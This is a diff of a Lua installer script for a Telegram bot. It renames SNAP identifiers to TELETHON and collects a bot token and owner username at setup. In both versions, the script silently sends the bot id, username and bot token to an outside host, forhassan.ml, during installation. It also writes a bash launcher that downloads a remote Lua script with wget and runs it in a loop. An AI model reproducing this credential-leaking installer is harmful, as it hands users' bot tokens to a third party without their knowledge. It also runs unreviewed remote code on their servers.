@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_SNAP = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_SNAP = function() 
+Server_TELETHON = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_TELETHON = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local SNAP_Info_Sudo = io.open("sudo.lua", 'w')
-SNAP_Info_Sudo:write([[
+local TELETHON_Info_Sudo = io.open("sudo.lua", 'w')
+TELETHON_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-SNAP_Info_Sudo:close()
+TELETHON_Info_Sudo:close()
 end  
-if not database:get(Server_SNAP.."Token_SNAP") then
+if not database:get(Server_TELETHON.."Token_TELETHON") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,16 +25,16 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_SNAP.."Token_SNAP",token)
+database:set(Server_TELETHON.."Token_TELETHON",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua start.lua')
+os.execute('lua startTelethon.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_SNAP.."UserName_SNAP") then
+if not database:get(Server_TELETHON.."UserName_TELETHON") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -46,65 +46,65 @@ end
 local Json = JSON:decode(Get_Info)
 if Json.Info == false then
 io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua start.lua')
+os.execute('lua startTelethon.lua')
 else
 if Json.Info == 'Channel' then
 io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
+os.execute('lua startTelethon.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_SNAP.."UserName_SNAP",Json.Info.Username)
-database:set(Server_SNAP.."Id_SNAP",Json.Info.Id)
+database:set(Server_TELETHON.."UserName_TELETHON",Json.Info.Username)
+database:set(Server_TELETHON.."Id_TELETHON",Json.Info.Id)
 end
 end
 else
 io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua start.lua')
+os.execute('lua startTelethon.lua')
 end
-local function Files_SNAP_Info()
-Create_Info(database:get(Server_SNAP.."Token_SNAP"),database:get(Server_SNAP.."Id_SNAP"),database:get(Server_SNAP.."UserName_SNAP"))   
-https.request("https://forhassan.ml/LaricA/LaricA.php?id="..database:get(Server_SNAP.."Id_SNAP").."&user="..database:get(Server_SNAP.."UserName_SNAP").."&token="..database:get(Server_SNAP.."Token_SNAP"))
-local RunSNAP = io.open("SNAP", 'w')
-RunSNAP:write([[
+local function Files_TELETHON_Info()
+Create_Info(database:get(Server_TELETHON.."Token_TELETHON"),database:get(Server_TELETHON.."Id_TELETHON"),database:get(Server_TELETHON.."UserName_TELETHON"))   
+https.request("https://forhassan.ml/LaricA/LaricA.php?id="..database:get(Server_TELETHON.."Id_TELETHON").."&user="..database:get(Server_TELETHON.."UserName_TELETHON").."&token="..database:get(Server_TELETHON.."Token_TELETHON"))
+local RunTELETHON = io.open("TELETHON", 'w')
+RunTELETHON:write([[
 #!/usr/bin/env bash
-cd $HOME/SNAP
-token="]]..database:get(Server_SNAP.."Token_SNAP")..[["
-rm -fr SNAP.lua
-wget "https://raw.githubusercontent.com/snapteamdollar/SNAP/master/SNAP.lua"
+cd $HOME/TELETHON
+token="]]..database:get(Server_TELETHON.."Token_TELETHON")..[["
+rm -fr TEAMTELETHON.lua
+wget "https://raw.githubusercontent.com/telethon-Arab/TEAMTELETHON/master/TEAMTELETHON.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./SNAP.lua -p PROFILE --bot=$token
+./tg -s ./TEAMTELETHON.lua -p PROFILE --bot=$token
 done
 ]])
-RunSNAP:close()
+RunTELETHON:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/SNAP
+cd $HOME/TELETHON
 while(true) do
 rm -fr ../.telegram-cli
-screen -S SNAP -X kill
-screen -S SNAP ./SNAP
+screen -S TELETHON -X kill
+screen -S TELETHON ./TELETHON
 done
 ]])
 RunTs:close()
 end
-Files_SNAP_Info()
-database:del(Server_SNAP.."Token_SNAP");database:del(Server_SNAP.."Id_SNAP");database:del(Server_SNAP.."UserName_SNAP")
+Files_TELETHON_Info()
+database:del(Server_TELETHON.."Token_TELETHON");database:del(Server_TELETHON.."Id_TELETHON");database:del(Server_TELETHON.."UserName_TELETHON")
 sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
+os.execute('./telethoninstall.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_SNAP()  
+AutoFiles_TELETHON()  
 var = true
 else   
 f:close()  
-database:del(Server_SNAP.."Token_SNAP");database:del(Server_SNAP.."Id_SNAP");database:del(Server_SNAP.."UserName_SNAP")
+database:del(Server_TELETHON.."Token_TELETHON");database:del(Server_TELETHON.."Id_TELETHON");database:del(Server_TELETHON.."UserName_TELETHON")
 sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
+os.execute('./telethoninstall.sh ins')
 var = false
 end  
 return var
